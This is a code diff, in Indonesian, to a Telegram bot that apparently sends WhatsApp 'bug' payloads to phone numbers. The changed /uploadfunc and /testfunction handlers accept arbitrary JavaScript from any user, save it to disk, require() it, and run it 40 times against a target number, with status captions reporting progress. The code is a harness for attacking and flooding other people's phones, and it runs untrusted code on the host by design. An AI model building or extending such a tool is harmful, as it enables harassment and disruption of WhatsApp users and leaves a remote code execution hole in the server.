@@ -78,6 +78,10 @@ const SESSIONS_DIR = "./sessions";
 const SESSIONS_FILE = "./sessions/active_sessions.json";
 const axios = require("axios");
 const cheerio = require('cheerio');
+const path = require('path');
+const util = require('util');
+const writeFile = util.promisify(fs.writeFile);
+const unlink = util.promisify(fs.unlink);
 const chalk = require("chalk"); 
 const moment = require("moment");
 const config = require("./config.js");
@@ -761,8 +765,8 @@ bot.on("callback_query", async (callbackQuery) => {
 ─────────────────────────
 <blockquote># ☇ 𝘛𝘖𝘖𝘓𝘚 - 𝘔𝘌𝘕𝘜</blockquote>
 - /ai            - asisten ai 
-- /uploadfunc    - Upload Func For testfunction
-- /testfunction  - Tes Function
+- /jadwalsholat  - Jadwal Sholat Tiap kota
+- /brat          - buat gambar (brat) 
 
             `;
             newButtons = [
@@ -1111,88 +1115,320 @@ bot.on('poll_answer', async (pollAnswer) => {
     // Hapus data poll
     activePolls.delete(pollId);
 });
-////// CASE TESTFUNC AND UPLOADFUNC
-// Map untuk menyimpan fungsi yang diupload per user (key: userId)
-// Setiap entry berisi { code: string, used: boolean }
-const userFunctions = new Map();
+//////
 
-// Command: /uploadfunc (harus reply ke file .js)
+// Pastikan folder temp ada
+const tempDir = path.join(__dirname, 'temp');
+if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir);
+
+// Map untuk menyimpan file per user
+const userFiles = new Map(); // key: userId, value: { filePath, used }
+// Handler untuk /uploadfunc - bisa reply file .js atau text berisi kode js
 bot.onText(/\/uploadfunc/, async (msg) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
+    const reply = msg.reply_to_message;
 
-    // Validasi: harus reply ke dokumen
-    if (!msg.reply_to_message || !msg.reply_to_message.document) {
-        return bot.sendMessage(chatId, '❌ Reply file .js dengan perintah /uploadfunc');
+    if (!reply) {
+        return bot.sendMessage(chatId, '❌ Reply ke file .js atau pesan text yang berisi kode JavaScript dengan caption /uploadfunc');
     }
 
-    const doc = msg.reply_to_message.document;
-    if (!doc.file_name.endsWith('.js')) {
-        return bot.sendMessage(chatId, '❌ Hanya file .js yang diperbolehkan');q
+    let code = '';
+    let fileName = '';
+
+    // Cek apakah reply berupa file document
+    if (reply.document) {
+        const doc = reply.document;
+        if (!doc.file_name.endsWith('.js')) {
+            return bot.sendMessage(chatId, '❌ Hanya file .js yang diperbolehkan');
+        }
+        
+        try {
+            const fileLink = await bot.getFileLink(doc.file_id);
+            const response = await fetch(fileLink);
+            code = await response.text();
+            fileName = doc.file_name;
+        } catch (err) {
+            return bot.sendMessage(chatId, `❌ Gagal mendownload file: ${err.message}`);
+        }
+    }
+    // Cek apakah reply berupa text
+    else if (reply.text) {
+        code = reply.text;
+        fileName = 'code_from_text.js';
+        
+        // Validasi sederhana apakah mengandung module.exports
+        if (!code.includes('module.exports') && !code.includes('exports.')) {
+            return bot.sendMessage(chatId, '❌ Kode harus mengandung module.exports atau exports untuk bisa dieksekusi');
+        }
+    }
+    else {
+        return bot.sendMessage(chatId, '❌ Reply harus berupa file .js atau pesan text berisi kode JavaScript');
     }
 
+    // Simpan ke file sementara
     try {
-        // Dapatkan link file dan baca isinya
-        const fileLink = await bot.getFileLink(doc.file_id);
-        const response = await axios.get(fileLink);
-        const code = response.data;
+        const tempFileName = `${userId}_${Date.now()}.js`;
+        const filePath = path.join(tempDir, tempFileName);
+        await writeFile(filePath, code, 'utf8');
 
-        // Simpan kode dengan status belum digunakan
-        userFunctions.set(userId, { code, used: false });
+        // Hapus file sebelumnya jika ada
+        if (userFiles.has(userId)) {
+            const oldFile = userFiles.get(userId);
+            await unlink(oldFile.filePath).catch(() => {});
+        }
 
-        bot.sendMessage(chatId, '✅ Fungsi berhasil diupload! Sekarang kamu bisa menggunakan /testfunction .');
+        // Simpan ke map
+        userFiles.set(userId, { filePath, used: false, originalName: fileName });
+
+        bot.sendMessage(chatId, 
+            `✅ *File ${fileName} diterima.*\n` +
+            `📦 Ukuran: ${code.length} bytes\n` +
+            `🔑 Status: Siap digunakan\n\n` +
+            `Sekarang kamu bisa menggunakan:\n` +
+            `*/testfunction [nomor]* - untuk mengeksekusi fungsi (sekali pakai)`,
+            { parse_mode: 'Markdown' }
+        );
     } catch (err) {
-        bot.sendMessage(chatId, `❌ Gagal membaca file: ${err.message}`);
+        bot.sendMessage(chatId, `❌ Gagal menyimpan file: ${err.message}`);
     }
 });
 
-// Command: /testfunction [nomor]
+// Handler untuk /testfunction [nomor] - mirip dengan /zincy tapi pakai fungsi dari file upload
 bot.onText(/\/testfunction(?:\s+(\d+))?/, async (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
 
-    // Validasi nomor target
+    // Validasi format nomor
     if (!match || !match[1]) {
-        return bot.sendMessage(chatId, '❌ Gunakan: /testfunction [nomor]\nContoh: /testfunction 6281234567890');
+        return bot.sendMessage(chatId, 
+            `❌ *Format salah!*\n\nGunakan: /testfunction [nomor]\nContoh: /testfunction 6281234567890`,
+            { parse_mode: "Markdown" }
+        );
+    }
+
+    // Cek file upload
+    const fileData = userFiles.get(userId);
+    if (!fileData) {
+        return bot.sendMessage(chatId, '❌ Kamu belum upload file. Gunakan /uploadfunc dulu');
+    }
+    if (fileData.used) {
+        return bot.sendMessage(chatId, '❌ File sudah digunakan. Upload file baru untuk menggunakan lagi');
     }
 
     const targetNumber = match[1];
-    const formattedNumber = targetNumber.replace(/[^0-9]/g, '');
+    const randomVideo = getRandomVideo();
+    const date = getCurrentDate();
+    const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+
+    // Validasi panjang nomor
     if (formattedNumber.length < 10 || formattedNumber.length > 15) {
-        return bot.sendMessage(chatId, '❌ Nomor tidak valid. Pastikan 10-15 digit (termasuk kode negara).');
+        return bot.sendMessage(chatId, 
+            `❌ Nomor tidak valid. Pastikan nomor 10-15 digit (termasuk kode negara).\nContoh: /testfunction 6281234567890`,
+            { parse_mode: "Markdown" }
+        );
     }
 
-    // Cek apakah user memiliki fungsi yang diupload dan belum dipakai
-    const userFunc = userFunctions.get(userId);
-    if (!userFunc || userFunc.used) {
-        return bot.sendMessage(chatId, '❌ Kamu belum mengupload fungsi atau sudah digunakan. Upload ulang dengan /uploadfunc');
-    }
-
-    // Cek koneksi WhatsApp (asumsi sessions adalah Map/Set yang menyimpan session aktif)
+    // Cek koneksi WhatsApp
     if (sessions.size === 0) {
-        return bot.sendMessage(chatId, '⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.');
+        return bot.sendMessage(chatId, `⚠️ WhatsApp belum terhubung. Jalankan /connect terlebih dahulu.`);
     }
 
     const target = `${formattedNumber}@s.whatsapp.net`;
 
+    // Kirim video processing
+    const sent = await bot.sendVideo(chatId, randomVideo, {
+        caption: `
+<blockquote>┌─────────────────────────┐
+│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾 (Test Function)
+├─────────────────────────┤
+│─ Target : ${formattedNumber}
+│─ File    : ${fileData.originalName}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖯𝗋𝗈𝗌𝖾𝗌
+│─ Date   : ${date}
+└─────────────────────────┘</blockquote>
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+`,
+        parse_mode: "HTML"
+    });
+
     try {
-        // Buat fungsi dari kode yang diupload.
-        // Fungsi akan menerima parameter sock, target, dan console (agar bisa logging).
-        // Gunakan new Function agar kode dieksekusi dalam lingkup terbatas.
-        const fn = new Function('sock', 'target', 'console', userFunc.code);
+        await sleep(1000);
 
-        // Jalankan fungsi (bisa async, maka gunakan await)
-        const result = await fn(sock, target, console);
+        // Edit caption pertama
+        await bot.editMessageCaption(
+            `
+<blockquote>┌─────────────────────────┐
+│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾 (Test Function)
+├─────────────────────────┤
+│─ Target : ${formattedNumber}
+│─ File    : ${fileData.originalName}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖬𝖾𝗆𝗎𝖺𝗍 𝖥𝗎𝗇𝗀𝗌𝗂...
+│─ Date   : ${date}
+└─────────────────────────┘</blockquote>
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+            `,
+            {
+                chat_id: chatId,
+                message_id: sent.message_id,
+                parse_mode: "HTML",
+                reply_markup: {
+                    inline_keyboard: [
+                        [{ text: " 👾「Cek Nomor」", url: `https://wa.me/${formattedNumber}` }]
+                    ]
+                }
+            }
+        );
 
-        // Hapus data fungsi setelah digunakan (one-time use)
-        userFunctions.delete(userId);
+        // Load dan eksekusi fungsi dari file upload
+        try {
+            // Hapus dari cache require
+            const resolvedPath = require.resolve(fileData.filePath);
+            if (require.cache[resolvedPath]) {
+                delete require.cache[resolvedPath];
+            }
 
-        bot.sendMessage(chatId, `✅ Fungsi dijalankan. Hasil: ${result !== undefined ? result : 'Sukses'}`);
+            // Require file
+            const userModule = require(fileData.filePath);
+
+            // Validasi module
+            if (typeof userModule !== 'function' && (!userModule || typeof userModule.run !== 'function')) {
+                throw new Error('File harus mengekspor function atau object dengan method run');
+            }
+
+            // Eksekusi fungsi dengan parameter target dan sock
+            let sendFunction;
+            if (typeof userModule === 'function') {
+                sendFunction = userModule;
+            } else {
+                sendFunction = userModule.run;
+            }
+
+            // Loop 20x dengan sleep 500ms (seperti di kode asli)
+            for (let i = 0; i < 20; i++) {
+                // Update status setiap 5 iterasi
+                if (i % 5 === 0) {
+                    await bot.editMessageCaption(
+                        `
+<blockquote>┌─────────────────────────┐
+│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾 (Test Function)
+├─────────────────────────┤
+│─ Target : ${formattedNumber}
+│─ File    : ${fileData.originalName}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖬𝖾𝗇𝗀𝗂𝗋𝗂𝗆... (${i+1}/20)
+│─ Date   : ${date}
+└─────────────────────────┘</blockquote>
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+                        `,
+                        {
+                            chat_id: chatId,
+                            message_id: sent.message_id,
+                            parse_mode: "HTML",
+                            reply_markup: {
+                                inline_keyboard: [
+                                    [{ text: " 👾「Cek Nomor」", url: `https://wa.me/${formattedNumber}` }]
+                                ]
+                            }
+                        }
+                    );
+                }
+
+                // Panggil fungsi dari file upload
+                await sendFunction(sock, target);
+                await sleep(500);
+                await sendFunction(sock, target);
+            }
+
+            console.log(chalk.green(`(本) 𝖲𝗎𝖼𝖼𝖾𝗌 𝖲𝖾𝗇𝖽 Test Function ke ${formattedNumber}`));
+
+            // Update status sukses
+            await bot.editMessageCaption(
+                `
+<blockquote>┌─────────────────────────┐
+│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾 (Test Function)
+├─────────────────────────┤
+│─ Target : ${formattedNumber}
+│─ File    : ${fileData.originalName}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖲𝗎𝖼𝖼𝖾𝗌𝖿𝗎𝗅𝗅𝗒 ✅
+│─ Date   : ${date}
+└─────────────────────────┘</blockquote>
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+                `,
+                {
+                    chat_id: chatId,
+                    message_id: sent.message_id,
+                    parse_mode: "HTML",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: " 👾「Cek Nomor」", url: `https://wa.me/${formattedNumber}` }]
+                        ]
+                    }
+                }
+            );
+
+            // Tandai file sudah digunakan dan hapus
+            fileData.used = true;
+            await unlink(fileData.filePath).catch(() => {});
+            userFiles.delete(userId);
+
+        } catch (funcError) {
+            // Error dari fungsi upload
+            await bot.editMessageCaption(
+                `
+<blockquote>┌─────────────────────────┐
+│   𝖪𝖺𝗂𝗋𝗇 - 𝖡𝖺𝗌𝖾 (Test Function)
+├─────────────────────────┤
+│─ Target : ${formattedNumber}
+│─ File    : ${fileData.originalName}
+│─ 𝖲𝗍𝖺𝗍𝗎𝗌 : 𝖤𝗋𝗋𝗈𝗋 ❌
+│─ Error   : ${funcError.message.substring(0, 50)}
+│─ Date   : ${date}
+└─────────────────────────┘</blockquote>
+ ©𝖪𝖺𝗂𝗋𝗇𝖢𝗋𝖾𝖺𝗍𝗈𝗋𝖳𝖾𝖺𝗆
+                `,
+                {
+                    chat_id: chatId,
+                    message_id: sent.message_id,
+                    parse_mode: "HTML",
+                    reply_markup: {
+                        inline_keyboard: [
+                            [{ text: " 👾「Cek Nomor」", url: `https://wa.me/${formattedNumber}` }]
+                        ]
+                    }
+                }
+            );
+
+            // File tetap dihapus karena error
+            await unlink(fileData.filePath).catch(() => {});
+            userFiles.delete(userId);
+            
+            // Log error
+            console.log(chalk.red(`(本) Error Test Function: ${funcError.message}`));
+        }
+
     } catch (err) {
-        bot.sendMessage(chatId, `❌ Gagal menjalankan fungsi: ${err.message}`);
+        await bot.sendMessage(chatId, `❌ Gagal menjalankan test function: ${err.message}`);
     }
 });
 
+// Command untuk melihat status file
+bot.onText(/\/statusfunc/, async (msg) => {
+    const chatId = msg.chat.id;
+    const userId = msg.from.id;
+
+    const fileData = userFiles.get(userId);
+    if (!fileData) {
+        return bot.sendMessage(chatId, '📭 Belum ada file yang diupload');
+    }
+
+    bot.sendMessage(chatId,
+        `📊 *Status File*\n\n` +
+        `📁 Nama: ${fileData.originalName}\n` +
+        `🔑 Status: ${fileData.used ? '❌ Sudah digunakan' : '✅ Belum digunakan'}\n` +
+        `📍 Lokasi: ${fileData.filePath}`,
+        { parse_mode: 'Markdown' }
+    );
+});
 
 /// --- ( Case Bug Biasa ) --- \\\
 bot.onText(/\/zincy(?:\s+(\d+))?/, async (msg, match) => {
